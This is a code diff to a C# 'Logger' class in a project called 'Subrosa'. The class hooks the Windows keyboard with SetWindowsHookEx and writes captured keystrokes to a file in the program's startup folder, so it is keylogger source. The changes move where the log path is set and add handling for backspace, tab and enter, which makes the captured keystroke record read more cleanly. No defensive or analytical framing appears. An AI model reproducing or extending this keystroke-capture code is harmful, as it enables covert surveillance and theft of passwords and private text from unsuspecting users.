@@ -9,7 +9,7 @@ namespace Subrosa
 {
     public class Logger
     {
-        public static string LogPath => Application.StartupPath;
+        public static string LogPath { get; set; }
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
@@ -36,6 +36,7 @@ namespace Subrosa
         public Logger()
         {
             _proc = HookCallback;
+            LogPath = Application.StartupPath;
         }
 
         public void Start()
@@ -54,8 +55,14 @@ namespace Subrosa
 
                 switch (vkCode)
                 {
-                    case 13:
+                    case 8: //backspace
                         sw.WriteLine("");
+                        break;
+                    case 9: //tab
+                        sw.WriteLine("  ");
+                        break;
+                    case 13: //enter
+                        sw.WriteLine("\r\n");
                         break;
                     case 32: //space
                         sw.Write(" ");
